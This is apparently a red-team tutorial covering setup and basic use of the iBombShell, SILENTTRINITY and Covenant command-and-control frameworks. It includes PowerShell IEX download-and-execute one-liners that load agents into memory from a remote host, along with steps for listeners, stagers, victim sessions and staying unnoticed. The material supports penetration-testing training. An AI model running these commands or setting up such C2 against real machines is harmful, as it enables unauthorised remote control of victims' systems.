> C2. Whether `Covenant`, `Empire`, `Silent` `Trinity`, `Cobalt` `Strike`... they are frameworks for the `post-exploitation` phase of a `red team operation`. They facilitate lateral movement, privilege escalation, creation of payloads, AV evasion.... Typically, when a C2 server needs to be used, it is not because s simply want to screenshot a single victim, but they are often used to facilitate `"large scale"` attacks, where most C2s allow others to connect and interact with `multiple` victims at the same time, such as launching a distributed denial of service "DDos" attack. Each server varies greatly between attacks, but a C2 generally consists of one or more covert `communication` channels between the devices of a victim `organization` and a `platform` that `controls` the `attacker`.


## __IBombShell__

- - __https://github.com/Telefonica/ibombshell__
- - __https://www.elladodelmal.com/2020/02/ibombshell-bypass-para-amsi-y-windows.html__

> iBombshell is a tool with two different aspects, one is to have a `dynamic` shell in `Powershell` avoiding the lack of pentesting tools in the local machine, and the second aspect is to manage the `"Warriors"` `(or control agents)` in `remote` to be able to execute `post-exploitation` actions in a Windows machine `(even GNU/Linux or MacOS do have Powershell Everysystem)`.

`wget / python`

```
wget https://raw.githubusercontent.com/Telefonica/ibombshell/master/console
```

```
python3 -m http.server
```

`Load Ibombshell In Memory / Powershell`

```Powershell
IEX (New-Object system.Net.WebClient).downloadString('http://ip:port/console')
```

`Now you can run the downloaded ibombshell console running`

```powershell
console
```

![Ibombshell](https://user-images.githubusercontent.com/84678370/131222160-fd72c26e-70b7-49e6-a9a0-58880acdbe4f.png)

### __Silent Mode__

`Load Ibombshell In Memory / Powershell`

```Powershell
IEX (New-Object system.Net.WebClient).downloadString('http://ip:port/console')
```
`or`

```powershell
IEX (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Telefonica/ibombshell/master/console')
```

`Clone Repo`

```
git clone https://github.com/Telefonica/ibombshell.git
```

`Install`

```
cd ibombshell\ c2/
pip install -r requirements.txt
```

`Prepare C2`

```
cd ibombshell\ c2/
```

```
python3 ibombshell.py
```

`Create the listener where the warriors will connected`

```powershell
iBombShell> load modules/listener.py
[+] Loading module...
[+] Module loaded!
iBombShell[modules/listener.py]> run
```

> The default listener port is 8080. Finally you can launch the console in silently mode on the host to get remote control

`Powershell`

```powershell
console -Silently -uriConsole http://ip or domain:port
```

![Ibombshell3](https://user-images.githubusercontent.com/84678370/131222810-6b2b14b9-779f-4265-a74f-08c9b651dd6d.png)

> Change the default port to https port 443.

```
cd ibombshell

cd ibombshell\ c2/

cd modules
```

```
nano listener.py
```

![Ibombshell2](https://user-images.githubusercontent.com/84678370/131222711-9b9621a1-3243-4a28-90d4-cc6ba6186e3f.png)

---

## __SILENT-TRINITY__
- - __https://www.hackplayers.com/2018/10/silenttrinity-post-explotacion-con-el.html__
- - __https://github.com/byt3bl33d3r/SILENTTRINITY__

> SILENTTRINITY is a modern, `asynchronous`, `multiplayer` and `multi-server` C2/post-exploitation framework powered by `Python 3` and `.NET` `DLR`. It is the culmination of extensive research into the use of third-party scripting languages embedded in .NET to dynamically call .NET `API`s, a technique the author coined as `BYOI` (Bring Your Own Interpreter). The goal of this tool and the BYOI concept is to shift the paradigm back to PowerShell-style attacks (as it offers much more flexibility than the traditional C# technique), but without using PowerShell.

### __Installation__

`Clone Repo`

```
git clone https://github.com/byt3bl33d3r/SILENTTRINITY
```

`Setup`

```
apt update
cd SILENTTRINITY
```

```
apt install python3 python3-dev python3-pip
sudo -H pip3 install -U pipenv
pip3 install -r requirements.txt
pipenv install && pipenv shell 
```

> If all the installation has gone well, we are going to start the server. 
 
```
python3 st.py teamserver --port 443 ip Password1234
```

![ST1](https://user-images.githubusercontent.com/84678370/131224856-9f76ceb0-d7d1-43ac-ba10-24d2c7f807b2.png)



- - __https://www.blackhillsinfosec.com/my-first-joyride-with-silenttrinity/__

> Next, we need to connect the client side. There are a couple of ways to do this. In `red team operations`, the server would run on some `cloud` or `VPS` service and we would connect to it from behind our own `proxies`, `VPN`, `firewalls`, etc. For this demo, I will do everything locally. (NOT RECOMMENDED, IF YOU HAVE ANY VPS, MOUNT YOUR SERVER THERE)`. 

`Client Connect`

```
python3 st client wss://<username>:<teamserver_password>@<teamserver_ip>:443
```

![ST2](https://user-images.githubusercontent.com/84678370/131224992-79a14160-fb55-435d-950c-aa387c5cadb4.png)

> Let's launch a `listener`

```
listeners
use https 
options
```

![ST3](https://user-images.githubusercontent.com/84678370/131225601-bf5da0c7-5daa-4499-a497-45843974b00c.png)

> You could generate your own certificates and keys to go a little more unnoticed, but for this test we will simply show the basic use of this C2 without generating any keys and certs.

```
start
```
![ST4](https://user-images.githubusercontent.com/84678370/131226316-0efc9e56-69a8-4905-a01f-3bce4ee47e83.png)


`Stagers`

``` 
stagers
list
```

```
use powershell_stageless

generate https
```

![ST6](https://user-images.githubusercontent.com/84678370/131229440-f9f95e3e-72e1-4ba3-ab06-6bff3620f416.png)

> Once here, you must find a way to run this .ps1 on the victim machine to get a session.

![ST7](https://user-images.githubusercontent.com/84678370/131229488-80eefd1f-88ab-4ca1-828c-05c2b6bb58b1.png)

> And now the big question, how do I interact with the session?

> Well don't worry we are going to show it.

### __Post-Ex Modules__

```
modules
list
```

![ST8](https://user-images.githubusercontent.com/84678370/131229614-2674a50c-3c3d-47be-bf09-32509ac402d8.png)

```
use boo/msgbox
options
```

![ST10](https://user-images.githubusercontent.com/84678370/131229853-3684b632-19e3-4c1f-b4ba-dce2d8ed9847.png)

```
set Text "Pwned Testing"
run 7c988as....
```

![ST9](https://user-images.githubusercontent.com/84678370/131229869-4e2a64e6-12dc-4781-8c88-42733f41b83e.png)

---

## __Covenant__

- __https://github.com/cobbr/Covenant__
- __https://www.blackmantisecurity.com/covenant-command-and-control-en-kali/__
- __https://posts.specterops.io/entering-a-covenant-net-command-and-control-e11038bcf462__
- __https://www.flu-project.com/2020/05/covenant-1.html__
- __https://www.flu-project.com/2020/06/covenant-2.html__

> Covenant is a `.NET` command and control framework aimed at highlighting the .NET attack surface, facilitating the use of .NET offensive techniques, and serving as a collaborative command and control platform for `red team` members.
Covenant is a cross-platform `ASP.NET Core` application that includes a web-based interface that enables multi-user collaboration.

### __Installation__

- - __https://github.com/cobbr/Covenant__
- - __https://github.com/cobbr/Covenant/wiki/Installation-And-Startup__

> Well, I think the best way to install it correctly is as explained in blackmantisecurity.

```
wget -qO- https://packages.microsoft.com/keys/microsoft.asc | gpg --dearmor > microsoft.asc.gpg

sudo mv microsoft.asc.gpg /etc/apt/trusted.gpg.d/

wget -q https://packages.microsoft.com/config/debian/10/prod.list

sudo mv prod.list /etc/apt/sources.list.d/microsoft-prod.list

sudo chown root:root /etc/apt/trusted.gpg.d/microsoft.asc.gpg

sudo chown root:root /etc/apt/sources.list.d/microsoft-prod.list
```

`SDK`

```
sudo apt-get update

sudo apt-get install apt-transport-https

sudo apt-get update

sudo apt install dotnet-sdk-2.2
```

`Clone Repo`

- - __https://github.com/cobbr/Covenant__

```
git clone --recurse-submodules https://github.com/cobbr/Covenant
```

`Build`

```
cd Covenant/Covenant
dotnet build
sudo dotnet run
```

![CT](https://user-images.githubusercontent.com/84678370/131232360-a3d2500c-6174-46f4-869d-0bcc8d5d9c62.png)

![CT1](https://user-images.githubusercontent.com/84678370/131232364-9a13a726-e44a-469e-a70b-511845bfc387.png)

`Listeners`

> `Name`: Name by which the listener will be identified.

> `Link address`: IP to which the listener will be linked (0.0.0.0.0 for all IPs on the machine).

> `Connection port`: the port to be used by the listener.

> `Connection address`: The IP or IPs that will be waiting for connections.

> `UseSSL`: whether the traffic will be encrypted using SSL.

> `HttpProfile`: Which http profile will be used for the listener.


![CT2](https://user-images.githubusercontent.com/84678370/131235431-112eab2e-1674-4087-987f-adb98f976516.png)

> You can create an SSL certificate with OpenSSL and add it to convenant. For this demonstration we will not be using any certificates.

![CT5](https://user-images.githubusercontent.com/84678370/131235444-aa553647-4917-4f41-abf4-985197588e23.png)


> As we can see in the previous image, our listener is already created and waiting for new sessions.

`Launchers`

![CT4](https://user-images.githubusercontent.com/84678370/131232929-d9bc2988-6727-4d35-a856-0082826ed890.png)

> For this demonstration we will use a `Powershell` launcher.


![CT3](https://user-images.githubusercontent.com/84678370/131235457-40c3c996-34e9-4d24-8269-af1f454815e7.png)

> Remember to check your version of `DotNet`

> Generate and launch powershell command

![CT9](https://user-images.githubusercontent.com/84678370/131235807-317bf2a3-54d6-44c7-b221-de16ba93901f.png)

![CT8](https://user-images.githubusercontent.com/84678370/131235780-0436d3db-50cf-40e4-adf7-cbde019c1e58.png)

> We can also load it into memory as follows.

> By simply downloading the .ps1 from covenant, we can do the following, from the path where the .ps1 is hosted

```
python3 -m http.server 8080
``` 

```powershell
IEX (New-Object System.Net.WebClient).DownloadString('http://ip:port/GruntHTTP.ps1')
``` 

> The problem with this, is that the session will not last long because when the victim turns off the pc and turns it on again, our .ps1 will no longer be hosted in memory, so we will not be able to interact with that session. 

![CT10](https://user-images.githubusercontent.com/84678370/131236009-60413172-c848-4e5f-ab54-394fc30513a5.png)

`note`

> Let it be clear that in this C2 module we are only teaching the `basics` `(how to configure C2, how to launch a session and how to interact with it)`, not the `intermediate-advanced` `(Av evasion, changing parts of C2`). That's why I also want to say, that you in a `red team operation`, you should `enforce` your sessions and not just launch the command in`powershell`, because in this test there is no `threat monitoring` or anything like that, in `real life`, launching that simple command in powershell `(Covenant)` would raise too many `alarms`, so you would be `flagged`.

### __Interact with a session__

> So far we have seen how to deploy covenant, including how to give us a session with a payload in Powershell. Well, now we will see how to interact with that session as part of a Post-Ex.

> For this test, we will simply create a directory in some path of the machine, with the `CreateDirectory` module.

`tasking`

![CT11](https://user-images.githubusercontent.com/84678370/131520577-e283c161-e075-4418-a6e6-317f8e9431fc.png)

![CT13](https://user-images.githubusercontent.com/84678370/131670740-1b611be5-2847-451a-aabd-bcc68fe89fde.png)

![CT12](https://user-images.githubusercontent.com/84678370/131520696-65bf1309-f57a-4513-b28e-517fdcce8cd7.png)

---
